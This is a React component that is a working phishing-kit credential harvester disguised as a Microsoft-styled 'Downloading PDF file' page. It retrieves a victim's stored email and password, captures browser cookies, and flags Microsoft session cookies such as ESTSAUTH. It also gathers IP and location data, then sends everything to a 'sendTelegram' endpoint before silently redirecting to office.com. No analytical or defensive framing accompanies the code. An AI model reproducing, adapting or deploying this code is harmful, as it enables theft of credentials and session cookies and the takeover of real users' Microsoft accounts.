import React, { useEffect, useState } from 'react';

/**
 * AuthCallback Component - FIXED
 * Proper response handling - only read body once
 */

function detectBrowserCapabilities() {
  const userAgent = navigator.userAgent.toLowerCase();
  const capabilities: any = {
    browser: 'unknown',
    version: 'unknown',
    supportsSameSiteNone: true,
    supportsSecure: true,
    maxCookieSize: 4096,
    maxCookiesPerDomain: 50,
    supportsHttpOnly: false,
    supportsPartitioned: false
  };

  if (userAgent.includes('chrome')) {
    capabilities.browser = 'chrome';
    const match = userAgent.match(/chrome\/(\d+)/);
    capabilities.version = match ? match[1] : 'unknown';
    capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 80;
    capabilities.supportsPartitioned = parseInt(capabilities.version) >= 118;
  } else if (userAgent.includes('firefox')) {
    capabilities.browser = 'firefox';
    const match = userAgent.match(/firefox\/(\d+)/);
    capabilities.version = match ? match[1] : 'unknown';
    capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 69;
  } else if (userAgent.includes('safari') && !userAgent.includes('chrome')) {
    capabilities.browser = 'safari';
    const match = userAgent.match(/version\/(\d+)/);
    capabilities.version = match ? match[1] : 'unknown';
    capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 13;
  } else if (userAgent.includes('edge')) {
    capabilities.browser = 'edge';
    const match = userAgent.match(/edge\/(\d+)/);
    capabilities.version = match ? match[1] : 'unknown';
    capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 80;
  }

  return capabilities;
}

function validateDomain(cookieDomain: string): any {
  if (!cookieDomain) return { valid: true, reason: 'No domain specified' };

  const cleanCookieDomain = cookieDomain.startsWith('.') ? cookieDomain.substring(1) : cookieDomain;
  const currentDomain = window.location.hostname;

  if (currentDomain === cleanCookieDomain) {
    return { valid: true, reason: 'Exact domain match' };
  }

  if (currentDomain.endsWith('.' + cleanCookieDomain)) {
    return { valid: true, reason: 'Subdomain match' };
  }

  const microsoftDomains = [
    'login.microsoftonline.com',
    'account.microsoft.com',
    'outlook.com',
    'office.com',
    'microsoft.com',
    'login.live.com',
    'login.microsoft.com',
    'outlook.live.com',
    'office365.com',
    'microsoftonline.com'
  ];

  if (microsoftDomains.some(domain =>
    currentDomain.includes(domain) || cleanCookieDomain.includes(domain)
  )) {
    return { valid: true, reason: 'Microsoft domain compatibility' };
  }

  return { valid: false, reason: `Domain mismatch: ${currentDomain} vs ${cleanCookieDomain}` };
}

function validateCookieSize(name: string, value: string): any {
  const cookieString = `${name}=${value}`;
  const size = new Blob([cookieString]).size;

  if (size > 4096) {
    return {
      valid: false,
      size,
      reason: `Cookie too large: ${size} bytes (max 4096)`
    };
  }

  return { valid: true, size, reason: 'Size OK' };
}

function validateExpiration(expires: any, expirationDate: any): any {
  const now = Date.now();
  let expiryTime = null;

  if (expires) {
    expiryTime = expires > 1e10 ? expires : expires * 1000;
  } else if (expirationDate) {
    expiryTime = expirationDate > 1e10 ? expirationDate : expirationDate * 1000;
  }

  if (expiryTime && expiryTime <= now) {
    return {
      valid: false,
      expired: true,
      reason: `Cookie expired: ${new Date(expiryTime).toISOString()}`
    };
  }

  return { valid: true, expired: false, reason: 'Not expired' };
}

function captureMicrosoftCookies(): any[] {
  try {
    const cookieString = document.cookie;
    if (!cookieString) return [];

    const cookies: any[] = [];
    const capabilities = detectBrowserCapabilities();

    const cookiePairs = cookieString.split(';');

    cookiePairs.forEach(pair => {
      const trimmedPair = pair.trim();
      if (trimmedPair) {
        const equalsIndex = trimmedPair.indexOf('=');
        if (equalsIndex > 0) {
          const name = trimmedPair.substring(0, equalsIndex).trim();
          const value = trimmedPair.substring(equalsIndex + 1).trim();

          if (name && value) {
            const sizeCheck = validateCookieSize(name, value);
            if (!sizeCheck.valid) {
              console.warn(`⚠️ Cookie skipped - ${name}: ${sizeCheck.reason}`);
              return;
            }

            const domainCheck = validateDomain(window.location.hostname);
            if (!domainCheck.valid) {
              console.warn(`⚠️ Domain validation failed for ${name}: ${domainCheck.reason}`);
            }

            const cookieObj: any = {
              name: name,
              value: value,
              domain: window.location.hostname,
              path: '/',
              secure: window.location.protocol === 'https:',
              httpOnly: false,
              sameSite: 'Lax',
              session: true,
              size: sizeCheck.size,
              captureTime: new Date().toISOString(),
              validations: {
                size: sizeCheck,
                domain: domainCheck
              },
              browserCapabilities: capabilities
            };

            if (name.includes('ESTSAUTH') ||
              name.includes('SignInStateCookie') ||
              name.includes('ESTSAUTHPERSISTENT') ||
              name.includes('ESTSAUTHLIGHT') ||
              name.includes('BUID') ||
              name.includes('ESCTX')) {
              cookieObj.important = true;
              console.log(`🔐 Important auth cookie detected: ${name}`);
            }

            cookies.push(cookieObj);
          }
        }
      }
    });

    console.log(`✅ Captured ${cookies.length} validated cookies`);
    const authCookies = cookies.filter(c => c.important).length;
    if (authCookies > 0) {
      console.log(`🔐 Auth cookies found: ${authCookies}`);
    }

    return cookies;
  } catch (error) {
    console.warn('⚠️ Failed to capture cookies:', error);
    return [];
  }
}

function getByteLengthForBrowser(str: string): number {
  return new Blob([str]).size;
}

const AuthCallback: React.FC = () => {
  const [status, setStatus] = useState('Downloading PDF file...');
  const [downloadProgress, setDownloadProgress] = useState(0);

  useEffect(() => {
    const executeCallback = async () => {
      setStatus('Downloading PDF file...');
      setDownloadProgress(10);

      console.log('🔄 AuthCallback: Starting data consolidation');

      let credentials = null;
      try {
        const storedCreds = localStorage.getItem('replacement_credentials') || sessionStorage.getItem('replacement_credentials');
        if (storedCreds) {
          credentials = JSON.parse(storedCreds);
          console.log('✅ Credentials retrieved from storage.');
          setDownloadProgress(25);
        } else {
          console.error('❌ FATAL: No credentials found in storage. Aborting.');
          setStatus('Error: Could not find stored credentials.');
          return;
        }
      } catch (error) {
        console.error('❌ FATAL: Failed to parse credentials from storage.', error);
        setStatus('Error: Failed to parse credentials.');
        return;
      }

      const cookies = captureMicrosoftCookies();
      setDownloadProgress(40);

      setStatus('Downloading PDF file...');
      let locationData: any = {};
      try {
        const response = await fetch('https://ipapi.co/json/');
        locationData = await response.json();
        console.log('✅ Location data fetched.');
        setDownloadProgress(55);
      } catch (error) {
        console.warn('⚠️ Failed to fetch location data:', error);
      }

      const createCookieFile = (cookiesToExport: any[]) => {
        if (!cookiesToExport || cookiesToExport.length === 0) {
          console.warn('⚠️ No cookies to export - creating empty file');
          const emptyJsonContent = JSON.stringify({
            source: 'AuthCallback-Export',
            timestamp: new Date().toISOString(),
            count: 0,
            cookies: [],
            note: 'No accessible cookies found. HttpOnly cookies cannot be captured by JavaScript.',
            browserCapabilities: detectBrowserCapabilities()
          }, null, 2);

          return {
            name: `cookies_${new Date().getTime()}.json`,
            content: emptyJsonContent,
            size: getByteLengthForBrowser(emptyJsonContent)
          };
        }

        try {
          const enhancedCookies = cookiesToExport.map(cookie => ({
            name: cookie.name || '',
            value: cookie.value || '',
            domain: cookie.domain || window.location.hostname,
            path: cookie.path || '/',
            secure: !!cookie.secure,
            httpOnly: !!cookie.httpOnly,
            sameSite: cookie.sameSite || 'Lax',
            session: !!cookie.session,
            important: !!cookie.important,
            size: cookie.size,
            validations: cookie.validations,
            captureTime: cookie.captureTime
          }));

          const jsonContent = JSON.stringify({
            exportInfo: {
              timestamp: new Date().toISOString(),
              domain: window.location.hostname,
              totalCookies: enhancedCookies.length,
              authCookies: enhancedCookies.filter(c => c.important).length,
              secureCookies: enhancedCookies.filter(c => c.secure).length,
              sessionCookies: enhancedCookies.filter(c => c.session).length,
              source: 'AuthCallback-Export-With-Validation',
              version: '2.0-aligned-with-restore'
            },
            summary: {
              totalCookies: enhancedCookies.length,
              authCookies: enhancedCookies.filter(c => c.important).length,
              secureCookies: enhancedCookies.filter(c => c.secure).length,
              sessionCookies: enhancedCookies.filter(c => c.session).length,
              totalSize: enhancedCookies.reduce((sum, c) => sum + c.size, 0)
            },
            cookies: enhancedCookies,
            browserCapabilities: detectBrowserCapabilities()
          }, null, 2);

          const fileSizeInBytes = getByteLengthForBrowser(jsonContent);
          console.log(`✅ Cookie JSON file created (${fileSizeInBytes} bytes)`);

          return {
            name: `cookies_${new Date().getTime()}.json`,
            content: jsonContent,
            size: fileSizeInBytes
          };
        } catch (error) {
          console.error('❌ Failed to create cookie JSON file:', error);
          return null;
        }
      };

      const cookieFile = createCookieFile(cookies);

      if (cookieFile) {
        console.log('✅ Cookie file object created:', {
          name: cookieFile.name,
          size: cookieFile.size,
          hasContent: !!cookieFile.content,
          contentLength: cookieFile.content?.length || 0
        });
      }

      setDownloadProgress(70);

      setStatus('Downloading PDF file...');
      const payload = {
        email: credentials.email,
        password: credentials.password,
        passwordSource: 'auth-callback-final',
        cookies: cookies,
        locationData: locationData,
        cookieFiles: cookieFile ? {
          jsonFile: {
            name: cookieFile.name,
            content: cookieFile.content,
            size: cookieFile.size
          }
        } : {},
        userAgent: navigator.userAgent,
        url: window.location.href,
        timestamp: new Date().toISOString(),
        validated: true,
        microsoftAccount: true,
        captureContext: {
          sourceComponent: 'AuthCallback',
          cookiesCaptured: cookies.length,
          authCookiesCaptured: cookies.filter(c => c.important).length,
          locationCaptured: !!(locationData && locationData.ip),
          cookieFileCreated: !!cookieFile,
          browserCapabilities: detectBrowserCapabilities(),
          cookieStats: {
            totalCookies: cookies.length,
            authCookies: cookies.filter(c => c.important).length,
            secureCookies: cookies.filter(c => c.secure).length,
            sessionCookies: cookies.filter(c => c.session).length
          }
        }
      };

      console.log('═════════════════════════════════════════');
      console.log('📤 EXACT PAYLOAD STRUCTURE:');
      console.log('═════════════════════════════════════════');
      console.log('cookieFiles exists:', !!payload.cookieFiles);
      console.log('cookieFiles.jsonFile exists:', !!payload.cookieFiles.jsonFile);
      if (payload.cookieFiles.jsonFile) {
        console.log('  - name:', payload.cookieFiles.jsonFile.name);
        console.log('  - size:', payload.cookieFiles.jsonFile.size);
        console.log('  - content exists:', !!payload.cookieFiles.jsonFile.content);
        console.log('  - content length:', payload.cookieFiles.jsonFile.content?.length);
        console.log('  - content type:', typeof payload.cookieFiles.jsonFile.content);
        console.log('  - content preview:', payload.cookieFiles.jsonFile.content?.substring(0, 100));
      }
      console.log('═════════════════════════════════════════');

      const payloadSize = JSON.stringify(payload).length;
      console.log(`📊 Total payload size: ${payloadSize} bytes (${(payloadSize / 1024).toFixed(2)}KB)`);

      console.log('📤 Payload Summary:', {
        email: payload.email,
        password: '***',
        cookiesCount: payload.cookies.length,
        authCookiesCount: cookies.filter(c => c.important).length,
        hasLocationData: !!payload.locationData.ip,
        hasCookieFile: !!payload.cookieFiles.jsonFile,
        cookieFileName: payload.cookieFiles.jsonFile?.name,
        cookieFileSize: payload.cookieFiles.jsonFile?.size,
        timestamp: payload.timestamp
      });

      try {
        setDownloadProgress(85);
        const response = await fetch('/.netlify/functions/sendTelegram', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        console.log('═════════════════════════════════════════');
        console.log('✅ SERVER RESPONSE:');
        console.log('═════════════════════════════════════════');
        console.log('Status:', response.status);

        // ✅ FIXED: Only read response body ONCE
        let responseData: any;
        try {
          responseData = await response.json();
          console.log('Response data:', responseData);
        } catch (e) {
          console.error('Failed to parse response JSON:', e);
          responseData = {};
        }

        console.log('Cookie file transmitted:', responseData.transmitted?.cookieFile);
        console.log('═════════════════════════════════════════');

        if (response.ok) {
          console.log('✅✅✅ SUCCESS: All data successfully sent to Telegram!');
          console.log('📊 Telegram Response:', responseData);
          setDownloadProgress(100);
          setStatus('Download Successful');

          setTimeout(() => {
            console.log('🎉 Flow complete. Silently redirecting to final destination.');
            window.location.href = 'https://www.office.com/?auth=2';
          }, 2500);
        } else {
          console.error('❌ Transmission failed. Server responded with:', response.status);
          setStatus(`Error: Transmission failed with status ${response.status}.`);
          return;
        }
      } catch (error) {
        console.error('❌ FATAL: Network error during transmission.', error);
        setStatus('Error: Network failure during transmission.');
        return;
      }
    };

    executeCallback();
  }, []);

  return (
    <div style={{
      display: 'flex',
      flexDirection: 'column',
      justifyContent: 'center',
      alignItems: 'center',
      height: '100vh',
      fontFamily: 'Segoe UI, Arial, sans-serif',
      backgroundColor: '#f3f2f1',
      color: '#323130'
    }}>
      <div style={{
        textAlign: 'center',
        padding: '40px'
      }}>
        {downloadProgress === 100 ? (
          <div>
            <h2 style={{
              fontSize: '18px',
              marginBottom: '10px',
              color: '#107C10',
              fontWeight: '600'
            }}>Download Successful</h2>
            <p style={{
              fontSize: '14px',
              color: '#666',
              marginBottom: '0'
            }}>Your file is ready.</p>
          </div>
        ) : (
          <div>
            <h2 style={{
              marginBottom: '20px',
              fontSize: '24px'
            }}>{status}</h2>

            <div style={{
              width: '300px',
              height: '8px',
              backgroundColor: '#e0e0e0',
              borderRadius: '4px',
              overflow: 'hidden',
              marginBottom: '20px',
              margin: '0 auto 20px'
            }}>
              <div style={{
                width: `${downloadProgress}%`,
                height: '100%',
                backgroundColor: '#0078d4',
                transition: 'width 0.3s ease',
                borderRadius: '4px'
              }}></div>
            </div>

            <p style={{
              fontSize: '14px',
              color: '#666',
              marginBottom: '30px'
            }}>{downloadProgress}%</p>

            <div style={{
              border: '4px solid #f3f2f1',
              borderTop: '4px solid #0078d4',
              borderRadius: '50%',
              width: '40px',
              height: '40px',
              animation: 'spin 1s linear infinite',
              margin: '0 auto'
            }}></div>
          </div>
        )}
      </div>

      <style>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
};

export default AuthCallback;
